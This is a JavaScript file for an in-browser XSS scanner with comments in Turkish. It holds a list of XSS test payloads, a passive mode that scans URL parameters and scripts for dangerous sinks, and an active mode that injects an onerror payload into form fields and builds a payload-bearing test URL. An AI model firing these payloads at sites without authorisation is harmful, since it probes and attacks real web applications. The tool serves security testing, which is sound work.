// scanner.js - Advanced XSS Scanner
(function() {
    console.log('Advanced XSS Scanner loaded!');
    
    // XSS Test Payload'ları
    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '" onmouseover="alert(\'XSS\')"',
        'javascript:alert("XSS")',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<input onfocus=alert("XSS") autofocus>',
        '<details open ontoggle=alert("XSS")>',
        '<video><source onerror=alert("XSS")>',
        '<form><button formaction=javascript:alert("XSS")>',
        '<math href="javascript:alert(\'XSS\')">CLICK',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '${alert("XSS")}',
        '{{alert("XSS")}}',
        '`${alert("XSS")}`'
    ];

    // UI oluştur
    function createUI() {
        const panel = document.createElement('div');
        panel.id = 'xss-scanner-panel';
        panel.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            width: 500px;
            background: #1a1a1a;
            color: white;
            padding: 15px;
            border-radius: 10px;
            z-index: 10000;
            font-family: Arial, sans-serif;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            max-height: 80vh;
            overflow-y: auto;
        `;
        
        panel.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;border-bottom:1px solid #444;padding-bottom:10px;">
                <h3 style="margin:0;color:#ff6b6b;">🔍 Advanced XSS Scanner</h3>
                <button onclick="document.getElementById('xss-scanner-panel').remove()" style="background:none;border:none;color:white;font-size:20px;cursor:pointer;">×</button>
            </div>
            
            <div style="margin-bottom:15px;">
                <label style="display:block;margin-bottom:5px;">Test Modu:</label>
                <select id="testMode" style="width:100%;padding:5px;background:#333;color:white;border:1px solid #555;">
                    <option value="passive">Pasif Tarama (Güvenli)</option>
                    <option value="active">Aktif Test (Dikkatli kullanın!)</option>
                </select>
            </div>
            
            <div id="xss-results" style="margin:10px 0;font-size:12px;">
                <p>Select mode and click "Start Scan"</p>
            </div>
            
            <div style="margin-top:15px;display:flex;gap:10px;">
                <button onclick="startAdvancedScan()" style="background:#4CAF50;color:white;border:none;padding:8px 15px;border-radius:5px;cursor:pointer;flex:1;">Start Scan</button>
                <button onclick="clearResults()" style="background:#ff9800;color:white;border:none;padding:8px 15px;border-radius:5px;cursor:pointer;">Clear</button>
            </div>
            
            <div style="margin-top:10px;font-size:11px;color:#888;">
                ⚠️ Active mode dikkatle kullanın - gerçek payload'lar gönderir
            </div>
        `;
        
        document.body.appendChild(panel);
    }
    
    // Sonuçları logla
    function logResult(message, type = 'info') {
        const colors = {
            'critical': '#ff4757',
            'high': '#ff6b6b',
            'medium': '#ffa502', 
            'low': '#fffa65',
            'info': '#70a1ff',
            'safe': '#2ed573'
        };
        
        const resultDiv = document.createElement('div');
        resultDiv.style.cssText = `
            background: #2d2d2d;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            border-left: 4px solid ${colors[type]};
            font-size: 12px;
        `;
        resultDiv.innerHTML = message;
        document.getElementById('xss-results').appendChild(resultDiv);
    }

    // Pasif tarama - sadece analiz
    function passiveScan() {
        logResult('🔍 <strong>Pasif Tarama Başladı</strong>', 'info');
        
        // URL parametre analizi
        const urlParams = new URLSearchParams(window.location.search);
        let suspiciousParams = [];
        
        urlParams.forEach((value, key) => {
            xssPayloads.forEach(payload => {
                if (value.includes(payload.substring(0, 10)) || 
                    key.includes(payload.substring(0, 10))) {
                    suspiciousParams.push({key, value, payload});
                }
            });
        });
        
        if (suspiciousParams.length > 0) {
            suspiciousParams.forEach(param => {
                logResult(
                    `🚨 <strong>Şüpheli URL Parametresi</strong><br>
                     Parametre: <code>${param.key}</code><br>
                     Değer: <code>${param.value}</code><br>
                     Benzer Payload: <code>${param.payload}</code>`,
                    'high'
                );
            });
        } else {
            logResult(`✅ ${urlParams.size} URL parametresi tarandı - şüpheli içerik bulunamadı`, 'safe');
        }
        
        // Form analizi
        const forms = document.getElementsByTagName('form');
        logResult(`📝 ${forms.length} form bulundu`, 'info');
        
        Array.from(forms).forEach((form, index) => {
            const inputs = form.querySelectorAll('input, textarea, select');
            let formInfo = `Form ${index + 1}: `;
            let inputTypes = [];
            
            inputs.forEach(input => {
                inputTypes.push(input.type || input.tagName.toLowerCase());
            });
            
            logResult(`Form ${index + 1}: ${inputs.length} input (${inputTypes.join(', ')})`, 'low');
        });
        
        // DOM XSS pattern'leri
        const dangerousPatterns = [
            { pattern: /innerHTML\s*=[^=]/, name: 'innerHTML assignment', risk: 'high' },
            { pattern: /outerHTML\s*=[^=]/, name: 'outerHTML assignment', risk: 'high' },
            { pattern: /document\.write\([^)]/, name: 'document.write', risk: 'high' },
            { pattern: /eval\s*\([^)]/, name: 'eval function', risk: 'critical' },
            { pattern: /setTimeout\s*\([^,]*\)/, name: 'setTimeout with string', risk: 'medium' },
            { pattern: /setInterval\s*\([^,]*\)/, name: 'setInterval with string', risk: 'medium' },
            { pattern: /\.src\s*=[^=]javascript:/, name: 'javascript: src', risk: 'high' }
        ];
        
        const scripts = document.getElementsByTagName('script');
        let foundPatterns = [];
        
        Array.from(scripts).forEach((script, index) => {
            const content = script.innerHTML;
            dangerousPatterns.forEach(pattern => {
                if (pattern.pattern.test(content)) {
                    foundPatterns.push({
                        pattern: pattern.name,
                        risk: pattern.risk,
                        script: index + 1
                    });
                }
            });
        });
        
        if (foundPatterns.length > 0) {
            foundPatterns.forEach(found => {
                logResult(
                    `⚠️ <strong>DOM XSS Pattern Bulundu</strong><br>
                     Pattern: ${found.pattern}<br>
                     Risk: ${found.risk.toUpperCase()}<br>
                     Script: #${found.script}`,
                    found.risk
                );
            });
        } else {
            logResult('✅ Tehlikeli DOM patternleri bulunamadı', 'safe');
        }
    }

    // Aktif tarama - gerçek testler
    async function activeScan() {
        logResult('⚡ <strong>Aktif Test Başladı - DİKKAT!</strong>', 'critical');
        
        // Form testleri
        const forms = document.getElementsByTagName('form');
        let testedForms = 0;
        
        Array.from(forms).forEach((form, formIndex) => {
            const inputs = form.querySelectorAll('input[type="text"], input[type="search"], textarea');
            
            if (inputs.length > 0) {
                testedForms++;
                logResult(`Testing form ${formIndex + 1} with ${inputs.length} inputs`, 'medium');
                
                // Basit bir test payload'ı ekle
                inputs.forEach((input, inputIndex) => {
                    const originalValue = input.value;
                    input.value = `"><img src=x onerror=console.log('XSS_Test_${formIndex}_${inputIndex}')>`;
                    logResult(`Input ${inputIndex + 1} filled with test payload`, 'low');
                    
                    // 2 saniye sonra eski haline getir
                    setTimeout(() => {
                        input.value = originalValue;
                    }, 2000);
                });
            }
        });
        
        if (testedForms === 0) {
            logResult('❌ Test edilebilir form bulunamadı', 'info');
        }
        
        // URL testi - yeni pencere aç
        setTimeout(() => {
            logResult('🔗 URL testleri yapılıyor...', 'info');
            
            const currentUrl = new URL(window.location.href);
            const testPayload = '<img src=x onerror=console.log("XSS_URL_Test")>';
            
            // URL'ye test parametresi ekle
            currentUrl.searchParams.set('testxss', testPayload);
            
            logResult(
                `Test URL: <code>${currentUrl.toString().substring(0, 100)}...</code><br>
                <button onclick="window.open('${currentUrl.toString()}', '_blank')" 
                 style="background:#ff4757;color:white;border:none;padding:5px;border-radius:3px;cursor:pointer;margin-top:5px;">
                 Test URL'sini Aç</button>`,
                'high'
            );
        }, 1000);
    }

    // Ana tarama fonksiyonu
    window.startAdvancedScan = function() {
        const testMode = document.getElementById('testMode').value;
        const results = document.getElementById('xss-results');
        results.innerHTML = '';
        
        if (testMode === 'passive') {
            passiveScan();
        } else {
            if (confirm('⚠️ AKTİF TEST MODU!\n\nBu mod gerçek XSS payloadları gönderir. Sadece test etme izniniz olan sitelerde kullanın.\n\nDevam edilsin mi?')) {
                activeScan();
            }
        }
    };
    
    window.clearResults = function() {
        document.getElementById('xss-results').innerHTML = '<p>Select mode and click "Start Scan"</p>';
    };
    
    // UI'yı başlat
    createUI();
    
    // Mevcut sayfayı hızlı analiz et
    setTimeout(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const forms = document.getElementsByTagName('form').length;
        
        logResult(
            `📊 <strong>Hızlı Analiz:</strong><br>
             URL Parametreleri: ${urlParams.size}<br>
             Formlar: ${forms}<br>
             Scriptler: ${document.scripts.length}`,
            'info'
        );
    }, 100);
    
})();
